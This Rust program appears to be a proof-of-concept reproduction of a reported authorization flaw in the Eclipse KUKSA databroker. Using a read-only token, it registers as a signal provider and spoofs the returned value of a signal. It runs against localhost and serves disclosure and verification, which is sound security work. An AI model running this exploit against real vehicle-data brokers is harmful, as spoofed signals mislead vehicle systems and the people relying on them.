// Run as an example in the upstream databroker-examples package at
// Eclipse KUKSA commit 2936b2511bfadc519694e25d12f92402bdd763f6.
// Based on the public reproduction in Eclipse security report #384.
use std::time::Duration;

use databroker_proto::kuksa::val::v2::open_provider_stream_request::Action;
use databroker_proto::kuksa::val::v2::open_provider_stream_response;
use databroker_proto::kuksa::val::v2::value::TypedValue;
use databroker_proto::kuksa::val::v2::{
    Datapoint, GetProviderValueResponse, OpenProviderStreamRequest, ProvideSignalRequest,
    SampleInterval, Value,
};
use kuksa_common::ClientTraitV2;
use kuksa_val_v2::KuksaClientV2;

const TARGET_PATH: &str = "Kuksa.Databroker.CargoVersion";

fn datapoint_to_string(dp: Option<Datapoint>) -> Option<String> {
    let dp = dp?;
    let value = dp.value?;
    match value.typed_value? {
        TypedValue::String(s) => Some(s),
        other => Some(format!("{other:?}")),
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let reader_token = std::fs::read_to_string("jwt/read-all.token")?;
    let reader_token = reader_token.trim().to_owned();
    let (provider_scope, provider_token_path) =
        match std::env::var("KUKSA_REPRO_PROVIDER_TOKEN").as_deref() {
            Ok("provide") => ("provide", "jwt/provide-all.token"),
            _ => ("read", "jwt/read-all.token"),
        };
    let provider_token = std::fs::read_to_string(provider_token_path)?;
    let provider_token = provider_token.trim().to_owned();
    let fake_value =
        std::env::var("KUKSA_REPRO_FAKE_VALUE").unwrap_or_else(|_| "ATTACKER_CONTROLLED".to_owned());
    if fake_value.is_empty() || fake_value.len() > 64 || !fake_value.is_ascii() {
        return Err("fake value must contain 1 to 64 ASCII bytes".into());
    }
    let endpoint = match std::env::var("KUKSA_REPRO_PORT").as_deref() {
        Ok("55556") => "http://127.0.0.1:55556",
        Ok("55565") => "http://127.0.0.1:55565",
        Ok("55566") => "http://127.0.0.1:55566",
        _ => "http://127.0.0.1:55555",
    };

    let mut reader = KuksaClientV2::from_host(endpoint);
    reader.basic_client.set_access_token(&reader_token)?;
    let metadata = reader
        .list_metadata((TARGET_PATH.to_owned(), "*".to_owned()))
        .await?;
    let signal = metadata
        .iter()
        .find(|m| m.path == TARGET_PATH)
        .ok_or("target path not found")?;
    let signal_id = signal.id;
    let original = datapoint_to_string(reader.get_value(TARGET_PATH.to_owned()).await?);
    println!("provider_token_scope={provider_scope}");
    println!("target_path={TARGET_PATH}");
    println!("signal_id={signal_id}");
    println!("original_value={}", original.as_deref().unwrap_or("<none>"));

    let mut provider = KuksaClientV2::from_host(endpoint);
    provider.basic_client.set_access_token(&provider_token)?;
    let mut stream = provider.open_provider_stream(None).await?;
    stream
        .sender
        .send(OpenProviderStreamRequest {
            action: Some(Action::ProvideSignalRequest(ProvideSignalRequest {
                signals_sample_intervals: [(signal_id, SampleInterval { interval_ms: 0 })]
                    .into_iter()
                    .collect(),
            })),
        })
        .await?;
    let provide_response =
        tokio::time::timeout(Duration::from_secs(5), stream.receiver_stream.message()).await?;
    let provide_response = match provide_response {
        Ok(Some(response)) => response,
        Err(status) if status.code() == tonic::Code::PermissionDenied => {
            println!("provider_registration=denied");
            println!("grpc_status={status}");
            println!("value_override_observed=false");
            println!("read_scope_provider_hijack_reproduced=false");
            return Ok(());
        }
        Err(status) => return Err(status.into()),
        Ok(None) => return Err("provider stream closed early".into()),
    };
    match provide_response.action {
        Some(open_provider_stream_response::Action::ProvideSignalResponse(_)) => {
            println!("provider_registration=accepted")
        }
        other => return Err(format!("unexpected provider response: {other:?}").into()),
    }

    let mut hijack_stream = stream;
    let expected_fake_value = fake_value.clone();
    let responder = tokio::spawn(async move {
        loop {
            let msg = hijack_stream.receiver_stream.message().await?;
            let msg = msg.ok_or_else(|| tonic::Status::aborted("provider stream closed"))?;
            if let Some(open_provider_stream_response::Action::GetProviderValueRequest(req)) =
                msg.action
            {
                hijack_stream
                    .sender
                    .send(OpenProviderStreamRequest {
                        action: Some(Action::GetProviderValueResponse(GetProviderValueResponse {
                            request_id: req.request_id,
                            entries: [(
                                signal_id,
                                Datapoint {
                                    timestamp: None,
                                    value: Some(Value {
                                            typed_value: Some(TypedValue::String(fake_value)),
                                    }),
                                },
                            )]
                            .into_iter()
                            .collect(),
                        })),
                    })
                    .await
                    .map_err(|e| tonic::Status::aborted(e.to_string()))?;
                break Ok::<(), tonic::Status>(());
            }
        }
    });
    tokio::time::sleep(Duration::from_millis(200)).await;
    let spoofed = datapoint_to_string(reader.get_value(TARGET_PATH.to_owned()).await?);
    responder.await??;
    println!("spoofed_value={}", spoofed.as_deref().unwrap_or("<none>"));
    if spoofed.as_deref() != Some(expected_fake_value.as_str()) {
        return Err("spoofing failed".into());
    }
    println!("value_override_observed=true");
    println!(
        "read_scope_provider_hijack_reproduced={}",
        provider_scope == "read"
    );
    Ok(())
}
